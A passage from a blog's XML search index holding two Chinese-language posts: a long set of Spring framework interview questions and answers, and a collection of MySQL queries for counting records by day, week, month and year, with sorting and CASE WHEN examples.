        <tag>Java</tag>
        <tag>Spring</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Spring 面试题相关]]></title>
    <url>%2Fblog%2F2017%2F04%2F13%2FSpring%20%E9%9D%A2%E8%AF%95%E9%A2%98%E7%9B%B8%E5%85%B3%2F</url>
    <content type="text"><![CDATA[Spring 面试相关问题1. 什么是spring? Spring 是个java企业级应用的开源开发框架。Spring主要用来开发Java应用，但是有些扩展是针对构建J2EE平台的web应用。Spring 框架目标是简化Java企业级应用开发，并通过POJO为基础的编程模型促进良好的编程习惯。 2. 使用Spring框架的好处是什么？ 轻量：Spring 是轻量的，基本的版本大约2MB 控制反转：Spring通过控制反转实现了松散耦合，对象们给出它们的依赖，而不是创建或查找依赖的对象们 面向切面的编程(AOP)：Spring支持面向切面的编程，并且把应用业务逻辑和系统服务分开 容器：Spring 包含并管理应用中对象的生命周期和配置 MVC框架：Spring的WEB框架是个精心设计的框架，是Web框架的一个很好的替代品 事务管理：Spring 提供一个持续的事务管理接口，可以扩展到上至本地事务下至全局事务（JTA） 异常处理：Spring 提供方便的API把具体技术相关的异常（比如由JDBC，Hibernate or JDO抛出的）转化为一致的unchecked 异常 3. Spring由哪些模块组成？ 以下是Spring 框架的基本模块： Core module Bean module Context module Expression Language module JDBC module ORM module OXM module Java Messaging Service(JMS) module Transaction module Web module Web-Servlet module Web-Struts module Web-Portlet module 4. 核心容器（应用上下文) 模块 这是基本的Spring模块，提供spring 框架的基础功能，BeanFactory 是 任何以spring为基础的应用的核心。Spring 框架建立在此模块之上，它使Spring成为一个容器。 5. BeanFactory – BeanFactory 实现举例 Bean 工厂是工厂模式的一个实现，提供了控制反转功能，用来把应用的配置和依赖从正真的应用代码中分离。最常用的BeanFactory 实现是XmlBeanFactory 类。 6. XMLBeanFactory 最常用的就是org.springframework.beans.factory.xml.XmlBeanFactory ，它根据XML文件中的定义加载beans。该容器从XML 文件读取配置元数据并用它去创建一个完全配置的系统或应用。 7. 解释AOP模块AOP模块用于发给我们的Spring应用做面向切面的开发， 很多支持由AOP联盟提供，这样就确保了Spring和其他AOP框架的共通性。这个模块将元数据编程引入Spring。 8. 解释JDBC抽象和DAO模块通过使用JDBC抽象和DAO模块，保证数据库代码的简洁，并能避免数据库资源错误关闭导致的问题，它在各种不同的数据库的错误信息之上，提供了一个统一的异常访问层。它还利用Spring的AOP 模块给Spring应用中的对象提供事务管理服务。 9. 解释对象/关系映射集成模块Spring 通过提供ORM模块，支持我们在直接JDBC之上使用一个对象/关系映射映射(ORM)工具，Spring 支持集成主流的ORM框架，如Hiberate,JDO和 iBATIS SQL Maps。Spring的事务管理同样支持以上所有ORM框架及JDBC。 10. 解释WEB 模块Spring的WEB模块是构建在application context 模块基础之上，提供一个适合web应用的上下文。这个模块也包括支持多种面向web的任务，如透明地处理多个文件上传请求和程序级请求参数的绑定到你的业务对象。它也有对Jakarta Struts的支持。 12. Spring配置文件Spring配置文件是个XML 文件，这个文件包含了类信息，描述了如何配置它们，以及如何相互调用。 13. 什么是Spring IOC 容器？ Spring IOC 负责创建对象，管理对象（通过依赖注入（DI），装配对象，配置对象，并且管理这些对象的整个生命周期。 14. IOC的优点是什么？ IOC 或 依赖注入把应用的代码量降到最低。它使应用容易测试，单元测试不再需要单例和JNDI查找机制。最小的代价和最小的侵入性使松散耦合得以实现。IOC容器支持加载服务时的饿汉式初始化和懒加载。 15. ApplicationContext通常的实现是什么？ FileSystemXmlApplicationContext ：此容器从一个XML文件中加载beans的定义，XML Bean 配置文件的全路径名必须提供给它的构造函数。ClassPathXmlApplicationContext：此容器也从一个XML文件中加载beans的定义，这里，你需要正确设置classpath因为这个容器将在classpath里找bean配置。WebXmlApplicationContext：此容器加载一个XML文件，此文件定义了一个WEB应用的所有bean。 16. Bean 工厂和 Application contexts 有什么区别？Application contexts提供一种方法处理文本消息，一个通常的做法是加载文件资源（比如镜像），它们可以向注册为监听器的bean发布事件。另外，在容器或容器内的对象上执行的那些不得不由bean工厂以程序化方式处理的操作，可以在Application contexts中以声明的方式处理。Application contexts实现了MessageSource接口，该接口的实现以可插拔的方式提供获取本地化消息的方法。 17. 一个Spring的应用看起来象什么？一个定义了一些功能的接口这实现包括属性，它的Setter ， getter 方法和函数等Spring AOPSpring 的XML 配置文件使用以上功能的客户端程序 依赖注入18. 什么是Spring的依赖注入？依赖注入，是IOC的一个方面，是个通常的概念，它有多种解释。这概念是说你不用创建对象，而只需要描述它如何被创建。你不在代码里直接组装你的组件和服务，但是要在配置文件里描述哪些组件需要哪些服务，之后一个容器（IOC容器）负责把他们组装起来。 19. 有哪些不同类型的IOC（依赖注入）方式？构造器依赖注入：构造器依赖注入通过容器触发一个类的构造器来实现的，该类有一系列参数，每个参数代表一个对其他类的依赖。Setter方法注入：Setter方法注入是容器通过调用无参构造器或无参static工厂 方法实例化bean之后，调用该bean的setter方法，即实现了基于setter的依赖注入。 20. 哪种依赖注入方式你建议使用，构造器注入，还是 Setter方法注入？你两种依赖方式都可以使用，构造器注入和Setter方法注入。最好的解决方案是用构造器参数实现强制依赖，setter方法实现可选依赖。 Spring Beans21.什么是Spring beans？Spring beans 是那些形成Spring应用的主干的java对象。它们被Spring IOC容器初始化，装配，和管理。这些beans通过容器中配置的元数据创建。比如，以XML文件中&lt;bean/&gt;的形式定义。Spring 框架定义的beans都是单件beans。在bean tag中有个属性”singleton”，如果它被赋为TRUE，bean 就是单件，否则就是一个 prototype bean。默认是TRUE，所以所有在Spring框架中的beans 缺省都是单件。 22. 一个 Spring Bean 定义 包含什么？一个Spring Bean 的定义包含容器必知的所有配置元数据，包括如何创建一个bean，它的生命周期详情及它的依赖。 23. 如何给Spring 容器提供配置元数据？这里有三种重要的方法给Spring 容器提供配置元数据。 XML配置文件。 基于注解的配置。 基于java的配置。 24. 你怎样定义类的作用域？ 当定义一个&lt;bean&gt; 在Spring里，我们还能给这个bean声明一个作用域。它可以通过bean 定义中的scope属性来定义。如，当Spring要在需要的时候每次生产一个新的bean实例，bean的scope属性被指定为prototype。另一方面，一个bean每次使用的时候必须返回同一个实例，这个bean的scope 属性 必须设为 singleton。 25. 解释Spring支持的几种bean的作用域Spring框架支持以下五种bean的作用域： singleton : bean在每个Spring ioc 容器中只有一个实例。 prototype：一个bean的定义可以有多个实例。 request：每次http请求都会创建一个bean，该作用域仅在基于web的Spring ApplicationContext情形下有效。 session：在一个HTTP Session中，一个bean定义对应一个实例。该作用域仅在基于web的Spring ApplicationContext情形下有效。 global-session：在一个全局的HTTP Session中，一个bean定义对应一个实例。该作用域仅在基于web的Spring ApplicationContext情形下有效。缺省的Spring bean 的作用域是Singleton。 26. Spring框架中的单例bean是线程安全的吗？不，Spring框架中的单例bean不是线程安全的。 27. 解释Spring框架中bean的生命周期Spring容器 从XML 文件中读取bean的定义，并实例化bean。Spring根据bean的定义填充所有的属性。如果bean实现了BeanNameAware 接口，Spring 传递bean 的ID 到 setBeanName方法。如果Bean 实现了 BeanFactoryAware 接口， Spring传递beanfactory 给setBeanFactory 方法。如果有任何与bean相关联的BeanPostProcessors，Spring会在postProcesserBeforeInitialization()方法内调用它们。如果bean实现IntializingBean了，调用它的afterPropertySet方法，如果bean声明了初始化方法，调用此初始化方法。如果有BeanPostProcessors 和bean 关联，这些bean的postProcessAfterInitialization() 方法将被调用。如果bean实现了 DisposableBean，它将调用destroy()方法。 28. 哪些是重要的bean生命周期方法？ 你能重载它们吗？有两个重要的bean 生命周期方法，第一个是setup ， 它是在容器加载bean的时候被调用。第二个方法是 teardown 它是在容器卸载类的时候被调用。The bean 标签有两个重要的属性（init-method和destroy-method）。用它们你可以自己定制初始化和注销方法。它们也有相应的注解（@PostConstruct和@PreDestroy）。 29. 什么是Spring的内部bean？当一个bean仅被用作另一个bean的属性时，它能被声明为一个内部bean，为了定义inner bean，在Spring 的 基于XML的 配置元数据中，可以在&lt;property/&gt;或 &lt;constructor-arg/&gt; 元素内使用&lt;bean/&gt; 元素，内部bean通常是匿名的，它们的Scope一般是prototype。 30. 在 Spring中如何注入一个java集合？Spring提供以下几种集合的配置元素： &lt;list&gt;类型用于注入一列值，允许有相同的值。 &lt;set&gt; 类型用于注入一组值，不允许有相同的值。 &lt;map&gt; 类型用于注入一组键值对，键和值都可以为任意类型。 &lt;props&gt;类型用于注入一组键值对，键和值都只能为String类型。 31. 什么是bean装配？ 装配，或bean 装配是指在Spring 容器中把bean组装到一起，前提是容器需要知道bean的依赖关系，如何通过依赖注入来把它们装配到一起。 32. 什么是bean的自动装配？ Spring 容器能够自动装配相互合作的bean，这意味着容器不需要&lt;constructor-arg&gt;和&lt;property&gt;配置，能通过Bean工厂自动处理bean之间的协作。 33. 解释不同方式的自动装配有五种自动装配的方式，可以用来指导Spring容器用自动装配方式来进行依赖注入 no：默认的方式是不进行自动装配，通过显式设置ref 属性来进行装配。 byName：通过参数名 自动装配，Spring容器在配置文件中发现bean的autowire属性被设置成byname，之后容器试图匹配、装配和该bean的属性具有相同名字的bean。 byType：通过参数类型自动装配，Spring容器在配置文件中发现bean的autowire属性被设置成byType，之后容器试图匹配、装配和该bean的属性具有相同类型的bean。如果有多个bean符合条件，则抛出错误。 constructor：这个方式类似于byType， 但是要提供给构造器参数，如果没有确定的带参数的构造器参数类型，将会抛出异常。 autodetect：首先尝试使用constructor来自动装配，如果无法工作，则使用byType方式。 34.自动装配有哪些局限性？自动装配的局限性是：重写：你仍需用 &lt;constructor-arg&gt;和 &lt;property&gt;配置来定义依赖，意味着总要重写自动装配。基本数据类型：你不能自动装配简单的属性，如基本数据类型，String字符串，和类。模糊特性：自动装配不如显式装配精确，如果有可能，建议使用显式装配。 35. 你可以在Spring中注入一个null 和一个空字符串吗？可以。** Spring注解36. 什么是基于Java的Spring注解配置? 给一些注解的例子基于Java的配置，允许你在少量的Java注解的帮助下，进行你的大部分Spring配置而非通过XML文件。以@Configuration注解为例，它用来标记类可以当做一个bean的定义，被Spring IOC容器使用。另一个例子是@Bean注解，它表示此方法将要返回一个对象，作为一个bean注册进Spring应用上下文。 37. 什么是基于注解的容器配置？相对于XML文件，注解型的配置依赖于通过字节码元数据装配组件，而非尖括号的声明。开发者通过在相应的类，方法或属性上使用注解的方式，直接组件类中进行配置，而不是使用xml表述bean的装配关系。 38. 怎样开启注解装配？注解装配在默认情况下是不开启的，为了使用注解装配，我们必须在Spring配置文件中配置&lt;context:annotation-config/&gt;元素。 39. @Required 注解这个注解表明bean的属性必须在配置的时候设置，通过一个bean定义的显式的属性值或通过自动装配，若@Required注解的bean属性未被设置，容器将抛出BeanInitializationException。 40. @Autowired 注解 @Autowired 注解提供了更细粒度的控制，包括在何处以及如何完成自动装配。它的用法和@Required一样，修饰setter方法、构造器、属性或者具有任意名称和/或多个参数的PN方法。 41. @Qualifier 注解当有多个相同类型的bean却只有一个需要自动装配时，将@Qualifier 注解和@Autowire注解结合使用以消除这种混淆，指定需要装配的确切的bean。 Spring数据访问42.在Spring框架中如何更有效地使用JDBC？使用SpringJDBC 框架，资源管理和错误处理的代价都会被减轻。所以开发者只需写statements 和 queries从数据存取数据，JDBC也可以在Spring框架提供的模板类的帮助下更有效地被使用，这个模板叫JdbcTemplate （例子见这里here） 43. JdbcTemplateJdbcTemplate 类提供了很多便利的方法解决诸如把数据库数据转变成基本数据类型或对象，执行写好的或可调用的数据库操作语句，提供自定义的数据错误处理。 44. Spring对DAO的支持Spring对数据访问对象（DAO）的支持旨在简化它和数据访问技术如JDBC，Hibernate or JDO 结合使用。这使我们可以方便切换持久层。编码时也不用担心会捕获每种技术特有的异常。 45. 使用Spring通过什么方式访问Hibernate？在Spring中有两种方式访问Hibernate：控制反转 Hibernate Template和 Callback继承 HibernateDAOSupport提供一个AOP 拦截器 46. Spring支持的ORMSpring支持以下ORM： Hibernate iBatis JPA (Java Persistence API) TopLink JDO (Java Data Objects) OJB 47.如何通过HibernateDaoSupport将Spring和Hibernate结合起来？用Spring的 SessionFactory 调用 LocalSessionFactory。集成过程分三步：配置the Hibernate SessionFactory继承HibernateDaoSupport实现一个DAO在AOP支持的事务中装配 48. Spring支持的事务管理类型Spring支持两种类型的事务管理： 编程式事务管理：这意味你通过编程的方式管理事务，给你带来极大的灵活性，但是难维护。 声明式事务管理：这意味着你可以将业务代码和事务管理分离，你只需用注解和XML配置来管理事务。 49. Spring框架的事务管理有哪些优点？它为不同的事务API 如 JTA，JDBC，Hibernate，JPA 和JDO，提供一个不变的编程模式。它为编程式事务管理提供了一套简单的API而不是一些复杂的事务API如它支持声明式事务管理。它和Spring各种数据访问抽象层很好得集成。 50. 你更倾向用那种事务管理类型？大多数Spring框架的用户选择声明式事务管理，因为它对应用代码的影响最小，因此更符合一个无侵入的轻量级容器的思想。声明式事务管理要优于编程式事务管理，虽然比编程式事务管理（这种方式允许你通过代码控制事务）少了一点灵活性。 Spring面向切面编程（AOP）51. 解释AOP面向切面的编程，或AOP， 是一种编程技术，允许程序模块化横向切割关注点，或横切典型的责任划分，如日志和事务管理。 52. Aspect 切面AOP核心就是切面，它将多个类的通用行为封装成可重用的模块，该模块含有一组API提供横切功能。比如，一个日志模块可以被称作日志的AOP切面。根据需求的不同，一个应用程序可以有若干切面。在Spring AOP中，切面通过带有@Aspect注解的类实现。 52. 在Spring AOP 中，关注点和横切关注的区别是什么？关注点是应用中一个模块的行为，一个关注点可能会被定义成一个我们想实现的一个功能。横切关注点是一个关注点，此关注点是整个应用都会使用的功能，并影响整个应用，比如日志，安全和数据传输，几乎应用的每个模块都需要的功能。因此这些都属于横切关注点。 54. 连接点连接点代表一个应用程序的某个位置，在这个位置我们可以插入一个AOP切面，它实际上是个应用程序执行Spring AOP的位置。 55. 通知通知是个在方法执行前或执行后要做的动作，实际上是程序执行时要通过SpringAOP框架触发的代码段。Spring切面可以应用五种类型的通知：+before：前置通知，在一个方法执行前被调用+after：在方法执行之后调用的通知，无论方法执行是否成功+after-returning：仅当方法成功完成后执行的通知+after-throwing：在方法抛出异常退出时执行的通知+around：在方法执行之前和之后调用的通知 56. 切点切入点是一个或一组连接点，通知将在这些位置执行。可以通过表达式或匹配的方式指明切入点。 57. 什么是引入？引入允许我们在已存在的类中增加新的方法和属性。 58. 什么是目标对象？被一个或者多个切面所通知的对象。它通常是一个代理对象。也指被通知（advised）对象。 59. 什么是代理？代理是通知目标对象后创建的对象。从客户端的角度看，代理对象和目标对象是一样的。 60. 有几种不同类型的自动代理？ BeanNameAutoProxyCreator DefaultAdvisorAutoProxyCreator Metadata autoproxying 61. 什么是织入。什么是织入应用的不同点？织入是将切面和到其他应用类型或对象连接或创建一个被通知对象的过程。织入可以在编译时，加载时，或运行时完成。 62. 解释基于XML Schema方式的切面实现在这种情况下，切面由常规类以及基于XML的配置实现。 63. 解释基于注解的切面实现在这种情况下(基于@AspectJ的实现)，涉及到的切面声明的风格与带有java5标注的普通java类一致。 Spring 的MVC64. 什么是Spring的MVC框架？Spring 配备构建Web 应用的全功能MVC框架。Spring可以很便捷地和其他MVC框架集成，如Struts，Spring 的MVC框架用控制反转把业务对象和控制逻辑清晰地隔离。它也允许以声明的方式把请求参数和业务对象绑定。 65. DispatcherServletSpring的MVC框架是围绕DispatcherServlet来设计的，它用来处理所有的HTTP请求和响应。 66. WebApplicationContextWebApplicationContext 继承了ApplicationContext 并增加了一些WEB应用必备的特有功能，它不同于一般的ApplicationContext ，因为它能处理主题，并找到被关联的servlet。 67. 什么是Spring MVC框架的控制器？控制器提供一个访问应用程序的行为，此行为通常通过服务接口实现。控制器解析用户输入并将其转换为一个由视图呈现给用户的模型。Spring用一个非常抽象的方式实现了一个控制层，允许用户创建多种用途的控制器。 68. @Controller 注解该注解表明该类扮演控制器的角色，Spring不需要你继承任何其他控制器基类或引用Servlet API。 69. @RequestMapping 注解 该注解是用来映射一个URL到一个类或一个特定的方处理法上。 springMVC的工作原理： 1、客户端发出一个http请求给web服务器，web服务器对http请求进行解析，如果匹配DispatcherServlet的请求映射路径（在web.xml中指定），web容器将请求转交给DispatcherServlet. 2、DipatcherServlet接收到这个请求之后将根据请求的信息（包括URL、Http方法、请求报文头和请求参数Cookie等）以及HandlerMapping的配置找到处理请求的处理器（Handler）。 3-4、DispatcherServlet根据HandlerMapping找到对应的Handler,将处理权交给Handler（Handler将具体的处理进行封装），再由具体的HandlerAdapter对Handler进行具体的调用。 5、Handler对数据处理完成以后将返回一个ModelAndView()对象给DispatcherServlet。 6、Handler返回的ModelAndView()只是一个逻辑视图并不是一个正式的视图，DispatcherSevlet通过ViewResolver将逻辑视图转化为真正的视图View。 7、Dispatcher通过model解析出ModelAndView()中的参数进行解析最终展现出完整的view并返回给客户端。 其他面试题：面试题前篇：http://lrshuai.top/atc/show/109面试题后篇：http://lrshuai.top/atc/show/110 上面的问题及答案都是网络上收集的，看到很多个不同的版本，也不知道具体的原作者是谁了。若涉及版权问题，烦请原作者联系我们，我们会在24小时内删除处理，谢谢！^_^]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Spring</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MYSQL查询今天，昨天，这个周，上个周，这个月，上个月，今年，去年的数据]]></title>
    <url>%2Fblog%2F2017%2F04%2F10%2FMYSQL%E6%9F%A5%E8%AF%A2%E4%BB%8A%E5%A4%A9%EF%BC%8C%E6%98%A8%E5%A4%A9%EF%BC%8C%E8%BF%99%E4%B8%AA%E5%91%A8%EF%BC%8C%E4%B8%8A%E4%B8%AA%E5%91%A8%EF%BC%8C%E8%BF%99%E4%B8%AA%E6%9C%88%EF%BC%8C%E4%B8%8A%E4%B8%AA%E6%9C%88%EF%BC%8C%E4%BB%8A%E5%B9%B4%EF%BC%8C%E5%8E%BB%E5%B9%B4%E7%9A%84%E6%95%B0%E6%8D%AE%2F</url>
    <content type="text"><![CDATA[##一般后台做报表什么的，可能会用到 #####createTime —- 创建时间， 就是你要对比的时间，表的字段类型为 datetime ###直接上代码12345678910111213141516171819202122232425262728293031323334353637-- 查询上周的数据 -- SELECT count(id) as count FROM user WHERE YEARWEEK(date_format(createTime,&apos;%Y-%m-%d&apos;)) = YEARWEEK(now())-1; -- 查询这个周的数据-- SELECT count(id) as count FROM user WHERE YEARWEEK(date_format(createTime,&apos;%Y-%m-%d&apos;)) = YEARWEEK(now())-- 查询上个月的数据 -- select count(id) as count from user where date_format(createtime,&apos;%Y-%m&apos;)=date_format(DATE_SUB(curdate(), INTERVAL 1 MONTH),&apos;%Y-%m&apos;) -- 查询这个月的数据 -- SELECT count(id) as count FROM user WHERE date_format(createtime,&apos;%Y-%m&apos;)=date_format(now(),&apos;%Y-%m&apos;);-- select count(id) as count from `user` where DATE_FORMAT(createtime,&apos;%Y%m&apos;) = DATE_FORMAT(CURDATE(),&apos;%Y%m&apos;) ; -- 查询距离当前现在6个月的数据 -- select count(id) as count from user where createtime between date_sub(now(),interval 6 month) and now(); -- 查询今天的数据-- SELECT count(id) as count FROM user WHERE date_format(createtime,&apos;%Y-%m-%d&apos;)=date_format(now(),&apos;%Y-%m-%d&apos;);-- 查询昨天的数据-- SELECT * FROM user WHERE TO_DAYS(NOW())-TO_DAYS(createTime) = 1-- 今年的-- select * from `user` where YEAR(createTime)=YEAR(NOW());-- 去年的-- select * from `user` where YEAR(createTime)=YEAR(NOW())-1;-- 来一发集合的select t1.count as toDay, tt1.count as lastDay, t2.count as lastWeek, tt2.count as toWeek, t3.count as lastMonth, tt3.count as toMonth, t4.count as toYear, tt4.count as lastYear, t.count as total from (SELECT count(id) as count FROM user WHERE date_format(createtime,&apos;%Y-%m-%d&apos;)=date_format(now(),&apos;%Y-%m-%d&apos;)) t1,(SELECT count(id) as count FROM user WHERE TO_DAYS(NOW())-TO_DAYS(createTime) = 1) tt1,(SELECT count(id) as count FROM user WHERE YEARWEEK(date_format(createTime,&apos;%Y-%m-%d&apos;)) = YEARWEEK(now())-1) t2,(SELECT count(id) as count FROM user WHERE YEARWEEK(date_format(createTime,&apos;%Y-%m-%d&apos;)) = YEARWEEK(now())) tt2,(select count(id) as count from user where date_format(createtime,&apos;%Y-%m&apos;)=date_format(DATE_SUB(curdate(), INTERVAL 1 MONTH),&apos;%Y-%m&apos;)) t3,(SELECT count(id) as count FROM user WHERE date_format(createtime,&apos;%Y-%m&apos;)=date_format(now(),&apos;%Y-%m&apos;)) tt3,(select count(id) as count from `user` where YEAR(createTime)=YEAR(NOW())) t4,(select count(id) as count from `user` where YEAR(createTime)=YEAR(NOW())-1) tt4,(select count(id) as count from user) t ###统计当前月，后12个月，各个月的数据 ####下面是创建对照视图 sql12345678910111213141516CREATE ALGORITHM = UNDEFINED DEFINER = `tyro`@`%` SQL SECURITY DEFINERVIEW `past_12_month_view` AS SELECT DATE_FORMAT(CURDATE(), &apos;%Y-%m&apos;) AS `month` UNION SELECT DATE_FORMAT((CURDATE() - INTERVAL 1 MONTH), &apos;%Y-%m&apos;) AS `month` UNION SELECT DATE_FORMAT((CURDATE() - INTERVAL 2 MONTH), &apos;%Y-%m&apos;) AS `month` UNION SELECT DATE_FORMAT((CURDATE() - INTERVAL 3 MONTH), &apos;%Y-%m&apos;) AS `month` UNION SELECT DATE_FORMAT((CURDATE() - INTERVAL 4 MONTH), &apos;%Y-%m&apos;) AS `month` UNION SELECT DATE_FORMAT((CURDATE() - INTERVAL 5 MONTH), &apos;%Y-%m&apos;) AS `month` UNION SELECT DATE_FORMAT((CURDATE() - INTERVAL 6 MONTH), &apos;%Y-%m&apos;) AS `month` UNION SELECT DATE_FORMAT((CURDATE() - INTERVAL 7 MONTH), &apos;%Y-%m&apos;) AS `month` UNION SELECT DATE_FORMAT((CURDATE() - INTERVAL 8 MONTH), &apos;%Y-%m&apos;) AS `month` UNION SELECT DATE_FORMAT((CURDATE() - INTERVAL 9 MONTH), &apos;%Y-%m&apos;) AS `month` UNION SELECT DATE_FORMAT((CURDATE() - INTERVAL 10 MONTH), &apos;%Y-%m&apos;) AS `month` UNION SELECT DATE_FORMAT((CURDATE() - INTERVAL 11 MONTH), &apos;%Y-%m&apos;) AS `month` ####然后和你想要统计的表进行关联查询,如下的demo12345678select v.month, ifnull(b.minute,0) count from past_12_month_view v left join (select DATE_FORMAT(t.createTime,&apos;%Y-%m&apos;) month,count(t.id) minute from user t group by month) b on v.month = b.month group by v.month ###顺便把我上次遇到的一个排序小问题也写出来 #####数据表有一个sort_num 字段来代表排序，但这个字段有些值是null，现在的需求是,返回结果集按升序返回，如果sort_num 为null 则放在最后面mysql null 默认是最小的值，如果按升序就会在前面. ####解决方法：1234567SELECT * from table_name ORDER BY case WHEN sort_num is null then 1 else 0 end, sort_num asc ####再写一个吧 case when 统计个数12345678SELECT count(*) as total, sum(case when a.notice_type=&apos;praise&apos; THEN 1 else 0 end) as praiseNum, sum(case when a.notice_type=&apos;concern&apos; THEN 1 else 0 end) as concernNum, sum(case when a.notice_type=&apos;letter&apos; THEN 1 else 0 end) as letterNum, sum(case when a.notice_type=&apos;comment&apos; THEN 1 else 0 end) as commentNumFROM blog_notice a]]></content>
      <categories>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>MYSQL</tag>
      </tags>
  </entry>
</search>
